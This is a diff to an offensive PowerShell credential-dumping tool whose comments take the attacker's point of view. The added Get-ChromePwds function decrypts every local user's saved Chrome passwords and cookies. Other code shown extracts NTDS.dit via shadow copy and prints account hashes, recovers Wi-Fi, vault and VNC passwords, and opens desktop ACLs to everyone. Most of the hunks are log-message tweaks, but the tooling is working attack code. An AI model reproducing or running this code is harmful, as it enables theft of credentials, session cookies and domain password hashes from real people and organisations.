@@ -3228,7 +3715,7 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 						If ($MKGUID -eq $LSASS_MasterKey["Key_GUID"])
 						{
 							$Found = $True
-							Write-Host ("[...] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
+							Write-Host ("`t[+] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
 							$Keys = @{}
 							$Keys["MasterKey"] =  $LSASS_MasterKey["MasterKey"]
 							$SystemMasterKeys[$MKGUID] = $Keys
@@ -3246,6 +3733,8 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 		}
 	}
 	$MasterKeys["System"] = $SystemMasterKeys
+
+	Write-Host ""
 
 	return $MasterKeys
 }
@@ -3277,7 +3766,7 @@ function MKGUID($Data)
 }
 
 # Implementation of CryptUnprotectData() of Windows API
-# Calling the function CryptUnprotectData() in the context of a user allow to retrieve the secret, encrypted with User MasterKey (which is encrypted with User PreKey), without providing his password
+# Calling the function CryptUnprotectData() in the context of a user allow to Recover the secret, encrypted with User MasterKey (which is encrypted with User PreKey), without providing his password
 # From the attacker point of view, we are administrator of the computer and we may have gathered password/NT hash for a specific user
 # => So we have to implement the cryptographic decryption process of CryptUnprotectData() from Windows API to provide gathered MasterKeys
 function Decrypt-DPAPIBlob($Blob, $MasterKeys, $Entropy)
@@ -3400,7 +3889,7 @@ function Decrypt-DPAPIBlob($Blob, $MasterKeys, $Entropy)
 
 	If (-not $MasterKeyFound)
 	{
-		Write-Host ("[...] MasterKey with GUID {0} not found for decryption" -f ($MasterKey_GUID))
+		Write-Host ("`t[-] MasterKey with GUID {0} not found for decryption" -f ($MasterKey_GUID))
 		return $Null
 	}
 
@@ -3616,7 +4105,7 @@ function Decrypt-CredentialFile($FilePath, $MasterKeys)
 	}
 	Else
 	{
-		Write-Host ("[...] None MasterKeys allowed to decrypt CredentialFile")
+		Write-Host ("`t[-] None MasterKeys allowed to decrypt CredentialFile")
 		return $Null
 	}
 }
@@ -3629,7 +4118,7 @@ function Get-WiFiPwds($MasterKeys)
 		Get-WiFiPwds: With System MasterKeys we can always decrypt Wi-Fi pwds
 			- Encrypted password for each Wireless interface and each SSID is located at C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<IDForWirelessInterface>\<IDForSSID>.xml
 	#>
-	Write-Host ("`n[===] Searching Wi-Fi pwds and decrypt them with System's Master Keys [===]")
+	Write-Host ("[===] Searching Wi-Fi pwds and decrypt them with System's Master Keys [===]")
 
 	If (Test-Path "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\*\*")
 	{
@@ -3671,6 +4160,8 @@ function Get-WiFiPwds($MasterKeys)
 		}
 	}
 	Else { Write-Host "[-] No Wi-Fi pwds configured" }
+
+	Write-Host ""
 }
 
 function Get-CredentialVaultManager($MasterKeys)
@@ -3682,7 +4173,7 @@ function Get-CredentialVaultManager($MasterKeys)
 			3- Find all VCRD files and try to decrypt them with each keys gained from VPOL files
 	#>
 
-	Write-Host ("`n[===] Search VPOL and VCRD Files and decrypt them [===]")
+	Write-Host ("[===] Search VPOL and VCRD Files and decrypt them [===]")
 
 	$VPOLPaths = @()
 	ForEach ($User in (Get-ChildItem "C:\Users" -Force))
@@ -3784,7 +4275,7 @@ function Get-CredentialVaultManager($MasterKeys)
 					$Key = $BCRYPT_KEY_DATA_BLOB_HEADER[12..(12+$KeyData-1)]
 					$HexKey = [System.BitConverter]::ToString($Key).Replace("-", "")
 					$VPOLKeys += ,($Key)
-					Write-Host ("[...] Found VPOL Key = {0}" -f ($HexKey))
+					Write-Host ("`t[+] Found VPOL Key = {0}" -f ($HexKey))
 
 					$VPOLDecrypted = $VPOLDecrypted[(12+$Size-8)..($VPOLDecrypted.Length-1)]
 				}
@@ -3797,7 +4288,7 @@ function Get-CredentialVaultManager($MasterKeys)
 					$Key = $VPOLDecrypted[12..(12+$Size-8)]
 					$HexKey = [System.BitConverter]::ToString($Key).Replace("-", "")
 					$VPOLKeys += ,($Key)
-					Write-Host ("[...] Found VPOL Key = {0}" -f ($HexKey))
+					Write-Host ("`t[+] Found VPOL Key = {0}" -f ($HexKey))
 
 					$VPOLDecrypted = $VPOLDecrypted[(12+$Size-8)..($VPOLDecrypted.Length-1)]
 				}
@@ -3805,9 +4296,11 @@ function Get-CredentialVaultManager($MasterKeys)
 		}
 		Else
 		{
-			Write-Host "[...] None MasterKeys allowed to decrypt VPOL File"
+			Write-Host "`t[-] None MasterKeys allowed to decrypt VPOL File"
 		}
 	}
+
+	Write-Host ""
 
 	<# Unable to find valid VCRD files
 	$VCRDPaths = @()
@@ -3873,9 +4366,9 @@ function Get-CredentialVaultManager($MasterKeys)
 		If ($FriendlyName_Length -gt 0)
 		{
 			$FriendlyName = [System.Text.Encoding]::Unicode.GetString($FriendlyName)
-			Write-Host ("[...] Friendly name = {0}" -f ($FriendlyName))
+			Write-Host ("`t[+] Friendly name = {0}" -f ($FriendlyName))
 		}
-		Else { Write-Host "[...] Friendly name = <Empty>" }
+		Else { Write-Host "`t[+] Friendly name = <Empty>" }
 		$X = $Y
 		$Y = $X + 4
 		$AttributeMaps_Length = [BitConverter]::ToUInt32($VCRDBytes[$X..($Y-1)], 0)
@@ -3994,7 +4487,7 @@ function Get-CredentialVaultManager($MasterKeys)
 
 		ForEach ($VPOLKey in $VPOLKeys)
 		{
-			Write-Host ("[...] Decrypt VCRD File Attributes with VPOL Key {0}" -f ([System.BitConverter]::ToString($VPOLKey).Replace("-", "")))
+			Write-Host ("`t[+] Decrypt VCRD File Attributes with VPOL Key {0}" -f ([System.BitConverter]::ToString($VPOLKey).Replace("-", "")))
 			ForEach ($Attribute in $Attributes)
 			{
 				If ($Attribute["Data"])
@@ -4016,15 +4509,207 @@ function Get-CredentialVaultManager($MasterKeys)
 	#>
 }
 
+function Get-ChromePwds($MasterKeys)
+{
+	<#
+		Get-ChromePwds: Chrome Pwds/Cookies are encrypted with Users' MasterKeys, thus we cannot always decrypt them (We need their Pwd/NT Hash -> User PreKeys -> User MasterKeys)
+			1- Found encrypted datas, many potential paths
+				- C:\Users\<User>\[Local/Roaming/LocalLow]\[""/Google]\Chome\User Data\[""/Default]\[Local State/Login Data/Cookies]
+				- "Local State" is a file that contain a key encrypted with DPAPI
+				- "Login Data" is a SQLite file that contain passwords (= password_value) encrypted (action_url, username_value, password_value FROM logins)
+				- "Cookies" is a SQLite file that contain cookies (= encrypted_value) encrypted (host_key, name, path, encrypted_value FROM cookies)
+			2- Depending on Chrome versions
+				2.1- Chrome version < v80
+					- Try to decrypt DPAPI Blob with Decrypt-DPAPIBlob and MasterKeys and get the secret Pwd/Cookie
+				2.2- Chrome version >= v80
+					- Try to decrypt Local State Key with Decrypt-DPAPIBlob and MasterKeys
+					- From password_value/encrypted_value extract Nonce, CipherText, Tag : "v10"|Nonce|CipherText|Tag
+					- Secret Pwd/Cookie = AES256-GCMDecrypt (SecretKey = LocalStateKey decrypted, IV = Nonce, AuthTag = Tag, AuthData = "", CipherText = CipherText)
+	#>
+	
+	Write-Host ("[===] Searching Chrome pwds/cookies and decrypt them with Users' Master Keys")
+
+	LoadSQLite
+
+	$Results = @{}
+	ForEach ($Child in Get-ChildItem "C:\Users")
+	{
+		$UserDir = $Child.FullName
+		$UserName = $Child.Name
+		$User = @{}
+		ForEach ($Subfolder1 in @("Local", "Roaming", "LocalLow"))
+		{
+			ForEach ($Subfolder2 in @("", "Google"))
+			{
+				ForEach ($Subfolder3 in @("", "Default"))
+				{
+					$FileLocalState =  "$UserDir\AppData\$Subfolder1\$Subfolder2\Chrome\User Data\$Subfolder3\Local State"
+					If (Test-Path $FileLocalState)
+					{
+
+						$Content = Get-Content $FileLocalState
+						$EncBlobB64_1 = $Content.IndexOf('"encrypted_key":"')
+						$Content = $Content.Substring($EncBlobB64_1 + 17, $Content.Length - 1 - ($EncBlobB64_1 + 17))
+						$EncBlobB64_2 = $Content.IndexOf('"}')
+						$EncBlobB64 = $Content.Substring(0, $EncBlobB64_2)
+						$EncBlob = [System.Convert]::FromBase64String($EncBlobB64)
+						$User["EncLocalState"] = $EncBlob[5..$($EncBlob.Length-1)]
+					}
+
+					$FileLoginData = "$UserDir\AppData\$Subfolder1\$Subfolder2\Chrome\User Data\$Subfolder3\Login Data"
+					If (Test-Path $FileLoginData)
+					{
+						$User["FileLoginData"] = $FileLoginData
+					}
+
+					$FileCookies =  "$UserDir\AppData\$Subfolder1\$Subfolder2\Chrome\User Data\$Subfolder3\Cookies"
+					If (Test-Path $FileCookies)
+					{
+						$User["FileCookies"] = $FileCookies
+					}
+				}
+			}
+		}
+
+		If ($User["EncLocalState"] -or $User["FileLoginData"] -or $User["FileCookies"]) { $Results[$UserName] = $User }
+	}
+
+	If (($Results.Keys).Count -gt 0)
+	{
+		ForEach ($UserName in $Results.Keys)
+		{
+			$ClearValues = @{}
+			$EncValues = @{}
+			If ($Results[$UserName]["FileLoginData"])
+			{
+				$DB = [SqliteHelper]::Open($Results[$UserName]["FileLoginData"])
+				$Data = [SqliteHelper]::Execute($DB, 'SELECT action_url, username_value FROM logins')
+				$ClearValues["URLs"] = @()
+				foreach ($record in $Data) # Found that some time action_url may be empty
+				{
+					$actionUrl = $record.action_url
+				
+					# Check if action_url is empty, and provide a default string if it is
+					if (-not $actionUrl)
+					{
+						$actionUrl = "<EmptyURL>"
+					}
+				
+					# Add the action_url (either the original or the default) to the URLs array
+					$ClearValues["URLs"] += $actionUrl
+				}
+				$ClearValues["Logins"] = $Data.username_value
+				
+				$EncPwds = [byte[]]@()
+				For ($Offset = 0; $Offset -lt $ClearValues["Logins"].Length; $Offset += 1)
+				{
+					$Data = [SqliteHelper]::Execute($DB, "SELECT password_value FROM logins LIMIT 1 OFFSET $Offset")
+					$EncPwd = $Data.password_value
+					If ($EncPwd) { $EncPwds += ,$EncPwd }
+					Else { Break }
+				}
+				$EncValues["Pwds"] = $EncPwds
+			}
+
+			If ($Results[$UserName]["FileCookies"])
+			{
+				$DB = [SqliteHelper]::Open($Results[$UserName]["FileCookies"])
+				$Data = [SqliteHelper]::Execute($DB, 'SELECT host_key, name, path FROM cookies')
+				$ClearValues["HostKeys"] = $Data.host_key
+				$ClearValues["Names"] = $Data.name
+				$ClearValues["Paths"] = $Data.path
+				
+				$EncCookies = [byte[]]@()
+				For ($Offset = 0; $Offset -lt $ClearValues["Names"].Length; $Offset += 1)
+				{
+					$Data = [SqliteHelper]::Execute($DB, "SELECT encrypted_value FROM cookies LIMIT 1 OFFSET $Offset")
+					$EncCookie = $Data.encrypted_value
+					If ($EncCookie) { $EncCookies += ,$EncCookie }
+					Else { Break }
+				}
+				$EncValues["Cookies"] = $EncCookies
+			}
+
+			ForEach ($TypeEncValues in $EncValues.Keys)
+			{
+				For ($i = 0; $i -lt ($EncValues[$TypeEncValues]).Length; $i += 1)
+				{
+					# Chrome version >= v80
+					If ([System.Text.Encoding]::ASCII.GetString($EncValues[$TypeEncValues][$i][0..2]) -eq "v10")
+					{
+						If ($Results[$UserName]["EncLocalState"])
+						{
+							$Results[$UserName]["LocalState"] = Decrypt-DPAPIBlob $Results[$UserName]["EncLocalState"] $MasterKeys $Null
+							If ($Results[$UserName]["LocalState"])
+							{
+								$Nonce = $EncValues[$TypeEncValues][$i][3..14]
+								$CipherText = $EncValues[$TypeEncValues][$i][15..$($EncValues[$TypeEncValues][$i].Length-1-16)]
+								$Tag = $EncValues[$TypeEncValues][$i][$($EncValues[$TypeEncValues][$i].Length-16)..$($EncValues[$TypeEncValues][$i].Length-1)]
+								LoadAESGCMDecrypt
+								Try
+								{
+									$ClearTextBytes = [BCryptInterop]::AESGCMDecrypt($Results[$UserName]["LocalState"], $Nonce, $Null, $CipherText, $Tag)
+									$ClearText = [System.Text.Encoding]::ASCII.GetString($ClearTextBytes)
+									Switch ($TypeEncValues)
+									{
+										"Pwds" { Write-Host ("[+] Found credentials {0}:{1} for {2}" -f ($ClearValues["Logins"][$i], $ClearText, $ClearValues["URLs"][$i])) }
+										"Cookies" { Write-Host ("[+] Found cookie {0}:{1}:{2}:{3}" -f ($ClearValues["Names"][$i], $ClearValues["HostKeys"][$i], $ClearValues["Paths"][$i], $ClearText)) }
+									}
+								}
+								Catch
+								{
+									Write-Host ($_.Exception.Message)
+									Write-Host ("[-] AES256-GCM decryption of Chrome secret for user {0} failed" -f ($UserName))
+								}
+							}
+							Else
+							{
+								Write-Host ("[-] No MasterKey found to decrypt LocalState key for user {0}" -f ($UserName))
+							}
+						}
+						Else
+						{
+							Write-Host ("[-] No LocalState key found to decrypt Chrome secret for user {0}" -f ($UserName))
+						}
+					}
+					# Chrome version < v80
+					Else
+					{
+						$ClearTextBytes = Decrypt-DPAPIBlob $EncValues[$TypeEncValues] $MasterKeys $Null
+						If ($ClearTextBytes)
+						{
+							$ClearText = [System.Text.Encoding]::ASCII.GetString($ClearTextBytes)
+							Switch ($TypeEncValues)
+							{
+								"Pwds" { Write-Host ("[+] Found credentials {0}:{1} for {2}" -f ($ClearValues["Logins"][$i], $ClearText, $ClearValues["URLs"][$i])) }
+								"Cookies" { Write-Host ("[+] Found cookie {0}:{1}:{2}:{3}" -f ($ClearValues["Names"][$i], $ClearValues["HostKeys"][$i], $ClearValues["Paths"][$i], $ClearText)) }
+							}
+						}
+						Else
+						{
+							Write-Host ("[-] No MasterKey found to decrypt Chrome secret for user {0}" -f ($UserName))
+						}
+					}
+				}
+			}
+		}
+	}
+	Else { Write-Host "[+] No Chrome secrets saved" }
+
+	Write-Host ""
+}
+
 function Get-DPAPISecrets($MasterKeys)
 {
 	<#
 		Get-DPAPISecrets: Get DPAPI Secrets and try to decrypt them with MasterKeys
 			- Decrypting Wi-Fi passwords required System Master Keys thus It always succeed
+			- Decrypting Chrome secrets (cookies/pwds) require User Master Keys thus can failed (If user password/NT hash not provided)
 			- Decrypting VPOL Files with System and User MasterKeys -> Two VPOL Keys for each VPOL File decrypted -> Decrypt VCRD Files with VPOL Keys
 	#>
 
 	Get-WiFiPwds $MasterKeys
+	Get-ChromePwds $MasterKeys
 	Get-CredentialVaultManager $MasterKeys
 }
 
@@ -4146,12 +4831,12 @@ function TagToRecord($Cursor, $Tag, $FilterTables, $Version, $Revision, $PageSiz
 					$TAGGED_DATA_TYPE_MULTI_VALUE = 8
 					If ($ItemFlag -band $TAGGED_DATA_TYPE_COMPRESSED)
 					{
-						Write-Host ("[...] Unsupported tag column: {0}, flag: 0x{1:X}" -f ($Column, $ItemFlag))
+						Write-Host ("`t[-] Unsupported tag column: {0}, flag: 0x{1:X}" -f ($Column, $ItemFlag))
 						$Record[$Column] = $Null
 					}
 					ElseIf ($ItemFlag -band $TAGGED_DATA_TYPE_MULTI_VALUE)
 					{
-						Write-Host ("[...] Multivalue detected in column {0}, returning raw results" -f ($Column))
+						Write-Host ("`t[-] Multivalue detected in column {0}, returning raw results" -f ($Column))
 						$Record[$Column] = $Tag[$OffsetItem..($OffsetItem + $ItemSize - 1)]
 					}
 					Else
@@ -4199,7 +4884,7 @@ function TagToRecord($Cursor, $Tag, $FilterTables, $Version, $Revision, $PageSiz
 				$StringCodePages = @(1200, 20127)
 				If (-not ($StringCodePages -Contains $ColumnRecord["CodePage"]))
 				{
-					Write-Host ("[...] Unknown codepage 0x{0:X}" -f ($ColumnRecord["CodePage"]))
+					Write-Host ("`t[-] Unknown codepage 0x{0:X}" -f ($ColumnRecord["CodePage"]))
 				}
 				Else
 				{
@@ -4281,17 +4966,17 @@ function GetNextRow($NTDSContent, $Cursor, $FilterTables, $PageRecordLength, $Ve
 			# Leaf Page
 			If (($PageRecord["PageFlags"] -band $FLAGS_SPACE_TREE) -gt 0)
 			{
-				Write-Host "[...] FLAGS_SPACE_TREE exception"
+				Write-Host "`t[-] FLAGS_SPACE_TREE exception"
 				return $Null
 			}
 			ElseIf (($PageRecord["PageFlags"] -band $FLAGS_INDEX) -gt 0)
 			{
-				Write-Host "[...] FLAGS_INDEX exception"
+				Write-Host "`t[-] FLAGS_INDEX exception"
 				return $Null
 			}
 			ElseIf (($PageRecord["PageFlags"] -band $FLAGS_LONG_VALUE) -gt 0)
 			{
-				Write-Host "[...] FLAGS_LONG_VALUE exception"
+				Write-Host "`t[-] FLAGS_LONG_VALUE exception"
 				return $Null
 			}
 			Else
@@ -4462,8 +5147,8 @@ function ParsePageRecord($PageData, $PageRecord, $PageRecordLength, $Version, $R
 					$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][18..21], 0)
 					$CatalogEntry["Trailing"] = $LeafEntry["EntryData"][22..($LeafEntry["EntryData"].Length-1)]
 				}
-				ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_CALLBACK) { Write-Host "[...] Callback type not supported"; Break }
-				Else { Write-Host ("[...] Unknown catalog type 0x{0:X2}" -f ($CatalogEntry["DataType"])); Break }
+				ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_CALLBACK) { Write-Host "`t[-] Callback type not supported"; Break }
+				Else { Write-Host ("`t[-] Unknown catalog type 0x{0:X2}" -f ($CatalogEntry["DataType"])); Break }
 
 				# Parse item name
 				If ($DataDefinitionHeader["LastVariableDataType"] -gt 127) { $NumEntries = $DataDefinitionHeader["LastVariableDataType"] - 127 }
@@ -4497,7 +5182,7 @@ function ParsePageRecord($PageData, $PageRecord, $PageRecordLength, $Version, $R
 					$lvName = [System.Text.Encoding]::ASCII.GetString($LeafEntry["EntryData"][($DataDefinitionHeader["VariableSizeOffset"] + 7)..($DataDefinitionHeader["VariableSizeOffset"] + 7 + $lvLen - 1)])
 					$Global:PageTables[$Global:CurrentTable]["LongValues"][$lvName] = $LeafEntry
 				}
-				Else { Write-Host ("[...] Unknown type 0x{0:X2}" -f ($CatalogEntry["Type"])); Break }
+				Else { Write-Host ("`t[-] Unknown type 0x{0:X2}" -f ($CatalogEntry["Type"])); Break }
 			}
 		}
 	}
@@ -4832,7 +5517,7 @@ function DecryptUserRecord($UserRecord, $PEKs)
 	}
 	$UserInfo["AccountStatus"] = $AccountStatus
 
-	Write-Host ("[...] {0}:{1}:{2}:{3}:{4}" -f ($AccountStatus, $AccountName, $RID, [System.BitConverter]::ToString($LMHash).Replace("-", ""), [System.BitConverter]::ToString($NTHash).Replace("-", "")))
+	Write-Host ("`t[+] {0}:{1}:{2}:{3}:{4}" -f ($AccountStatus, $AccountName, $RID, [System.BitConverter]::ToString($LMHash).Replace("-", ""), [System.BitConverter]::ToString($NTHash).Replace("-", "")))
 
 	# TODO: __decryptSupplementalInfo(self, record, prefixTable=None, keysFile=None, clearTextFile=None)
 
@@ -4874,7 +5559,7 @@ function ParseNTDS($NTDSPath, $BootKey)
 	$Signature = $MainHeader[4..7]
 	If (@(Compare-Object $Signature @([Int]0xEF, [Int]0xCD, [Int]0xAB, [Int]0x89) -SyncWindow 0).Length -ne 0)
 	{
-		Write-Host "[...] Invalid NTDS.dit signature"
+		Write-Host "`t[-] Invalid NTDS.dit signature"
 		Return $Null
 	}
 	$Version = [BitConverter]::ToUInt32($MainHeader[8..11], 0)
@@ -4943,10 +5628,10 @@ function ParseNTDS($NTDSPath, $BootKey)
 	$UnknownFlags = [BitConverter]::ToUInt32($MainHeader[640..643], 0)
 
 	$TotalPages = ([Math]::Floor($NTDSContent.Length / $PageSize)) - 2
-	Write-Host ("[...] Database version = 0x{0:X4}" -f ($Version))
-	Write-Host ("[...] Database revision = 0x{0:X4}" -f ($FileFormatRevision))
-	Write-Host ("[...] Database page size = {0}" -f ($PageSize))
-	Write-Host ("[...] Database total pages = {0}" -f ($TotalPages))
+	Write-Host ("`t[+] Database version = 0x{0:X4}" -f ($Version))
+	Write-Host ("`t[+] Database revision = 0x{0:X4}" -f ($FileFormatRevision))
+	Write-Host ("`t[+] Database page size = {0}" -f ($PageSize))
+	Write-Host ("`t[+] Database total pages = {0}" -f ($TotalPages))
 
 	# 2- Parse DB starting at page 4
 	Write-Host ("[+] Parse NTDS database from page 4")
@@ -5003,8 +5688,8 @@ function ParseNTDS($NTDSPath, $BootKey)
 			$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
 			$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
 		}
-		ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_CALLBACK) { Write-Host "[...] Callback type not supported"; Return $Null }
-		Else { Write-Host ("[...] Unknown catalog type 0x{0:X2}" -f ($CatalogEntry["DataType"])); Return $Null }
+		ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_CALLBACK) { Write-Host "`t[-] Callback type not supported"; Return $Null }
+		Else { Write-Host ("`t[-] Unknown catalog type 0x{0:X2}" -f ($CatalogEntry["DataType"])); Return $Null }
 
 		# Position a cursor at the leaf levels for fast reading
 		$PageNum = $CatalogEntry["FatherDataPageNumber"]
@@ -5139,7 +5824,7 @@ function ParseNTDS($NTDSPath, $BootKey)
 		$PEKs = @()
 		If ($EncPEKListData)
 		{
-			Write-Host ("[...] Found Encrypted PEKList = {0}" -f ([System.BitConverter]::ToString($EncPEKListData).Replace("-", "")))
+			Write-Host ("`t[+] Found Encrypted PEKList = {0}" -f ([System.BitConverter]::ToString($EncPEKListData).Replace("-", "")))
 
 			# Structure from Impacket "secretsdump.py" : PEKLIST_ENC
 			$Header = $EncPEKListData[0..7]
@@ -5173,7 +5858,7 @@ function ParseNTDS($NTDSPath, $BootKey)
 					$Padding = $PEKData[1..3]
 					$PEK = $PEKData[4..19]
 
-					Write-Host ("[...] Decrypted PEK #{0} = {1}" -f ($i, [System.BitConverter]::ToString($PEK).Replace("-", "")))
+					Write-Host ("`t[+] Decrypted PEK #{0} = {1}" -f ($i, [System.BitConverter]::ToString($PEK).Replace("-", "")))
 					$PEKs += ,($PEK)
 				}
 			}
@@ -5208,7 +5893,7 @@ function ParseNTDS($NTDSPath, $BootKey)
 						Break
 					}
 
-					Write-Host ("[...] Decrypted PEK #{0} = {1}" -f ($Index, [System.BitConverter]::ToString($PEK).Replace("-", "")))
+					Write-Host ("`t[+] Decrypted PEK #{0} = {1}" -f ($Index, [System.BitConverter]::ToString($PEK).Replace("-", "")))
 					$PEKs += ,($PEK)
 
 					$CurIndex += 1
@@ -5217,7 +5902,7 @@ function ParseNTDS($NTDSPath, $BootKey)
 			}
 			Else
 			{
-				Write-Host ("[...] Unknown Encrypted PEKList Header format")
+				Write-Host ("`t[-] Unknown Encrypted PEKList Header format")
 				Return $Null
 			}
 
@@ -5256,13 +5941,13 @@ function ParseNTDS($NTDSPath, $BootKey)
 		}
 		Else
 		{
-			Write-Host ("[...] No PEKList found into NTDS")
+			Write-Host ("`t[-] No PEKList found into NTDS")
 			Return $Null
 		}
 	}
 	Else
 	{
-		Write-Host ("[...] No page table 'datatable' into NTDS")
+		Write-Host ("`t[-] No page table 'datatable' into NTDS")
 		Return $Null
 	}
 }
@@ -5274,7 +5959,7 @@ function Get-NTDS($Method, $BootKey)
 			- Method 1: Get C:\Windows\NTDS\ntds.dit via Shadow Copy and Parse It as Microsoft Extensive Storage Engine (ESE) format
 			- Method 2: Get NTDS.dit via IDL_DRSGetNCChanges()
 	#>
-	Write-Host ("`n[===] Searching NTDS.dit and try to parse It [===]")
+	Write-Host ("[===] Searching NTDS.dit and try to parse It [===]")
 
 	If (Test-Path "HKLM:SYSTEM\CurrentControlSet\Services\NTDS\Parameters")
 	{
@@ -5283,7 +5968,7 @@ function Get-NTDS($Method, $BootKey)
 			$NTDSLocationWithDrive = (Get-Item "HKLM:SYSTEM\CurrentControlSet\Services\NTDS\Parameters").GetValue("DSA Database file")
 			$NTDSLocation = $NTDSLocationWithDrive.Substring(3, $NTDSLocationWithDrive.Length-3)
 			$NTDSDrive = $NTDSLocationWithDrive.Substring(0, 2)
-			$NTDSSavePath = "C:\Windows\Temp\NTDS.dit"
+			$NTDSSavePath = "C:\Windows\Tasks\NTDS.dit"
 
 			# List existing Shadow Copies and try to find NTDS.dit, If not found: Create one
 			$ShadowCopies = Get-WMIObject -Class Win32_ShadowCopy -Computer "localhost"
@@ -5324,9 +6009,10 @@ function Get-NTDS($Method, $BootKey)
 
 			Write-Host ("[+] Saved NTDS.dit via Shadow Copy at $NTDSSavePath")
 
-			# Now we have NTDS.dit at C:\Windows\Temp\NTDS.dit, Let parse It using Microsoft Extensive Storage Engine (ESE) format
+			# Now we have NTDS.dit at C:\Windows\Tasks\NTDS.dit, Let parse It using Microsoft Extensive Storage Engine (ESE) format
 			$Users = ParseNTDS $NTDSSavePath $BootKey
 			Remove-Item $NTDSSavePath -Force
+			Write-Host ""
 			Return $Users
 		}
 		Else # Use Method = IDL_DRSGetNCChanges()
@@ -5337,7 +6023,7 @@ function Get-NTDS($Method, $BootKey)
 	}
 	Else
 	{
-		Write-Host ("[-] Computer is not a DC")
+		Write-Host ("[-] Computer is not a DC`n")
 		Return $Null
 	}
 }
@@ -5395,7 +6081,7 @@ function Get-VNCPwds()
 		Get-VNCPwds: Get Hex Encoded VNC passwords from registries or files (depending on VNC server), and decrypt them with same VNC Secret Key
 	#>
 
-	Write-Host ("`n[===] Searching VNC pwds and decrypt them with same VNC Secret Key [===]")
+	Write-Host ("[===] Searching VNC pwds and decrypt them with same VNC Secret Key [===]")
 
 	$RegPaths = @("HKLM:SOFTWARE\RealVNC\vncserver", "HKLM:SOFTWARE\TightVNC\Server", "HKLM:SOFTWARE\Wow6432Node\TightVNC\Server", "HKLU:SOFTWARE\TigerVNC\WinVNC4")
 	$FilePaths = @("$Env:Programfiles\UltraVNC\ultravnc.ini", "$Env:Programfiles (x86)\UltraVNC\ultravnc.ini", "$Env:Programfiles\Uvnc Bvba\UltraVNC\ultravnc.ini", "$Env:Programfiles (x86)\Uvnc Bvba\UltraVNC\ultravnc.ini")
@@ -5450,7 +6136,14 @@ function Get-VNCPwds()
 		}
 	}
 
-	If (-not ($FindOne)) { Write-Host "[-] No VNC pwds found" }
+	If (-not ($FindOne))
+	{
+		Write-Host "[-] No VNC pwds found`n"
+	}
+	Else
+	{
+		Write-Host ""
+	}
 }
 
 <##################>
@@ -5461,9 +6154,10 @@ function Get-VNCPwds()
 function Set-DesktopACLs
 {
 	# Enable SeSecurityPrivilege
-	If (-not (EnablePrivilege "SeSecurityPrivilege"))
+	$RetCode = EnablePrivilege "SeSecurityPrivilege"
+	If ($RetCode -ne 0)
 	{
-		Write-Host ("[-] Failed to enable SeSecurityPrivilege`n")
+		Write-Host ("[-] Failed to enable SeSecurityPrivilege with error {0}" -f ($RetCode))
 		return $False
 	}
 
@@ -5473,22 +6167,22 @@ function Set-DesktopACLs
 
 	if ($hWinsta -eq [IntPtr]::Zero)
 	{
-		Write-Host ("[-] OpenWindowStationW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
+		Write-Host ("[-] OpenWindowStationW() failed with error {0}" -f ([TokensAPI]::GetLastError()));
 		return $False
 	}
 
-	If (-not $(Set-DesktopACLToAllowEveryone $hWinsta)) { return $False }
+	If (-not (Set-DesktopACLToAllowEveryone $hWinsta)) { return $False }
 	$Discard = [TokensAPI]::CloseHandle($hWinsta)
 
 	# Change the privilege for the current desktop to allow full privilege for all users
 	$hDesktop = [TokensAPI]::OpenDesktopA("default", 0, $False, [TokensAPI]::DESKTOP_GENERIC_ALL -bor [TokensAPI]::WRITE_DAC)
 	if ($hDesktop -eq [IntPtr]::Zero)
 	{
-		Write-Host ("[-] OpenDesktopA() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
+		Write-Host ("[-] OpenDesktopA() failed with error {0}" -f ([TokensAPI]::GetLastError()));
 		return $False
 	}
 
-	If (-not $(Set-DesktopACLToAllowEveryone $hDesktop)) { return $False }
+	If (-not (Set-DesktopACLToAllowEveryone $hDesktop)) { return $False }
 	$Discard = [TokensAPI]::CloseHandle($hDesktop)
 	return $True
 }
@@ -5504,7 +6198,7 @@ function Set-DesktopACLToAllowEveryone($hObject)
 	$retVal = [TokensAPI]::GetSecurityInfo($hObject, 0x7, [TokensAPI]::DACL_SECURITY_INFORMATION, [Ref]$ppSidOwner, [Ref]$ppSidGroup, [Ref]$ppDacl, [Ref]$ppSacl, [Ref]$ppSecurityDescriptor)
 	if ($retVal -ne 0)
 	{
-		Write-Host ("[-] GetSecurityInfo() failed with error {0}`n" -f ($retVal));
+		Write-Host ("[-] GetSecurityInfo() failed with error {0}" -f ($retVal));
 		return $False
 	}
 
@@ -5518,7 +6212,7 @@ function Set-DesktopACLToAllowEveryone($hObject)
 		$Success = [TokensAPI]::CreateWellKnownSid(1, [IntPtr]::Zero, $pAllUsersSid, [Ref]$RealSize)
 		if (-not $Success)
 		{
-			Write-Host ("[-] CreateWellKnownSid() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
+			Write-Host ("[-] CreateWellKnownSid() failed with error {0}" -f ([TokensAPI]::GetLastError()));
 			return $False
 		}
 
@@ -5548,7 +6242,7 @@ function Set-DesktopACLToAllowEveryone($hObject)
 		$RetVal = [TokensAPI]::SetEntriesInAclW(1, [Ref]$ExplicitAccess, $ppDacl, [Ref]$NewDacl)
 		if ($RetVal -ne 0)
 		{
-			Write-Host ("[-] SetEntriesInAclW() failed with error {0}`n" -f ($retVal));
+			Write-Host ("[-] SetEntriesInAclW() failed with error {0}" -f ($retVal));
 			return $False
 		}
 
@@ -5556,7 +6250,7 @@ function Set-DesktopACLToAllowEveryone($hObject)
 
 		if ($NewDacl -eq [IntPtr]::Zero)
